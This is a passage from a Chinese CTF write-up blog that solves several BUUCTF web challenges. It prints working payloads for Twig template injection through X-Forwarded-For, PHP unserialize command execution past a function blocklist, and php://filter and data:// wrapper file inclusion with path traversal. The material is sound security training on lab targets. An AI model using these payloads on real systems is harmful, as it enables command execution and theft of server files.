src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a19.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p eb9fe07c-caaf-49e4-9eea-693ce10b8514>得到 flag，flag</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a20.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="bjdctf2020the-mystery-of-ip"><a class="markdownIt-Anchor" href="#bjdctf2020the-mystery-of-ip">#</a> [BJDCTF2020]The mystery of ip</h2><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a23.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>在 flag 页面发现 ip 地址，题目名称叫 ip 的秘密，看了大佬们的 wp 发现是存在 <code>X-Forwarded-For</code>  注入</p><p>抓包，添加 XFF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a24.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到 ip 被修改为 1，说明 XFF 是可控的</p><p>这里做个记录</p><blockquote><p>SSTI 漏洞</p><p>1.php 常用的</p><p>Smarty：Smarty 算是一种很老的 PHP 模板引擎了，非常的经典，使用的比较广泛</p><p>Twig：Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。</p><p>Blade：Blade 是 Laravel 提供的一个既简单又强大的模板引擎。和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p><p>2.Java 常用的</p><p>JSP：这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p><p>FreeMarker：FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML 网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p>Velocity：Velocity 作为历史悠久的模板引擎不单单可以替代 JSP 作为 JavaWeb 的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p><p>3.Python 常用的</p><p>Jinja2：flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p><p>django：django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的 ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p><p>tornado：tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p></blockquote><p>看别的师傅的 wp，这题相关的应该是下面两个</p><blockquote><p>1、Flask 可能存在 Jinjia2 模版注入漏洞</p><p>Flask 是一个很常用的 python 框架，其中存在 SSTI 漏洞。</p><p>SSTI，服务端模板注入，很早就知道这个东西，但没有仔细整理过，作为一种注入漏洞，简单说就是用户的说明会变成命令执行，比如 <code>&#123;&#123;7*7&#125;&#125;</code>  会变成 49。</p><p>模板：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">templeta = &quot;hello&quot; + &#123;&#123;user,id&#125;&#125;</span><br><span class="line">render(templeta)</span><br></pre></td></tr></table></figure><p>这里大括号里的东西是可变的，而当用户传入某些参数时系统可能会把用户的参数当成代码执行，例如 <code>&#123;&#123;7*7&#125;&#125;</code>  在执行时就会变成 49，这就存在漏洞。进一步，既然存在注入那肯定可以试着去执行系统命令，诸如 <code>&#123;&#123;os.system('ls')&#125;&#125;</code>  等等，继而引发各种问题。</p><p>2、PHP 可能存在 Twig 模版注入漏洞</p><p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了  <code>range()</code>  函数用来返回一个包含整数等差数列的列表：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="function"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title">range</span>(<span class="params"><span class="number">0</span>, <span class="number">3</span></span>) %&#125;</span></span><br><span class="line">&#123;&#123; i &#125;&#125;,</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">// Output: 0, 1, 2, 3</span></span><br></pre></td></tr></table></figure></blockquote><p>那这里尝试添加模板的算式，看看是否存在注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;9*9&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a25.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>确实存在漏洞，尝试是否能执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a26.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试获取查找 flag 的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a27.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到在 <code>/</code>  目录下存在 flag，尝试读取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a28.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 1f0cefd1-345d-4793-9d46-4b77250e6041>得到 flag，flag</p><h2 id="网鼎杯-2020-朱雀组phpweb"><a class="markdownIt-Anchor" href="#网鼎杯-2020-朱雀组phpweb">#</a> [网鼎杯 2020 朱雀组] phpweb</h2><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a29.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>题目进来一直在刷新，f12 也没什么收获，抓个包看看</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a30.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>抓包后可以发现以 POST 方式提交了两个参数一个是 func 一个是 p，func=date，p 是日期的格式，页面也一直回显这个形式的时间，func 又是常用的自定义函数名，验证一下二者是否有关系，可以使用 md5 () 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=md5&amp;p=123</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a31.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以发现回显内容已经变成了 md5 加密的 123，这里可以尝试使用命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=&#x27;ls&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a32.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>存在过滤，那可以尝试一下读取源码，可以使用多种函数进行查看，比如说：file_get_contents ()、highlight_file () ，show_source () 等</p><p>这里使用 file_get_contents () 函数</p><blockquote><p>file_get_contents (path): 读取 path 路径下文件的内容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多常用的函数，尝试反序列化</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a33.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a33.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>不在这一层里，返回上一层</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a34.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>还是没有，使用 <code>system(&quot;find / -name flag*&quot;)</code>  来匹配文件名带有 flag 的所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a36.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a36.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试读取这几个文件吧，这里面路径大部分都是相同的挑着读吧</p><p>/sys/devices/platform/serial8250/tty/ttyS25/flags</p><p>/sys/devices/virtual/net/lo/flags</p><p>/tmp/flagoefiu4r93</p><p>最后一个就是 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=readfile&amp;p=/tmp/flagoefiu4r93</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a37.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 9fe5f299-3d30-4957-9bc2-14ad56a69025>flag</p><p>这里看到有个师傅的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a38.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>应该是读取了所有的文件， <code>cat $(find / -name flag*)</code>  这段代码能理解为把所有文件名里面带有 flag 的文件当作一个新的变量然后一起读取出来？ <code>$</code>  是建一个 php 变量，可能可以这么理解吧。</p><h2 id="bsidescf-2020had-a-bad-day"><a class="markdownIt-Anchor" href="#bsidescf-2020had-a-bad-day">#</a> [BSidesCF 2020]Had a bad day</h2><p>进入网页，发现可能存在 sql 注入或者文件包含漏洞</p><p><code>http://9f9eacab-cb17-497a-b9bf-5aed58ad2bc7.node5.buuoj.cn:81/index.php?category=woofers</code></p><p>使用 php 伪协议尝试读取 index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a39-17065149223921.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a39-17065149223921.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到 warning 里面的内容 <code>php://filter/convert.base64-encode/resource=index.php.php</code></p><p>index.php 后面还有一个后缀，这里尝试删去 payload 里的 <code>.php</code>  看看能否读取成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a40.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功读取，base64 解码，提取出有用的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里做个记录：</p><blockquote><p>strpos ()- 查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>strrpos ()- 查找字符串在另一字符串中最后出现的位置（区分大小写）。</p><p>stripos ()- 查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p><p>strripos ()- 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）。</p><p>strpos(string,find,start)</p><p>string：</p><p>必须。</p><p>规定被搜索的字符串。</p><p>find：</p><p>必须。</p><p>规定要查找的字符。</p></blockquote><p>代码审计，利用 GET 方式传入的 category 需要有 woofers、meowers、index 三者之一才能包含传入 file 作为文件名</p><p>尝试读取 flag.php，经过尝试可以知道 flag 在 woofers 的上一级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=woofers/../flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a41.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a42.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看源码看到提示 <code>Can you read this flag?</code>  尝试使用 php 伪协议读取</p><p>这里记录一下 php://filter 伪协议可以套一层协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br><span class="line">php://filter/read=index/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p>这两种嵌套都是可以的</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a43.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a43.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>base64 解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> // flag&#123;3d618b09-d7ce-4d87-8464-01fb7bd3285e&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>拿到 flag</p><h2 id="bjdctf2020zjctf不过如此"><a class="markdownIt-Anchor" href="#bjdctf2020zjctf不过如此">#</a> [BJDCTF2020] ZJCTF，不过如此</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET 方式获取两个参数，text 需要 ===I have a dream，file 根据提示利用 php 伪协议读取</p><p>构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a45.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a45.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>base64 解码得到 next.php</p><figure class="highlight 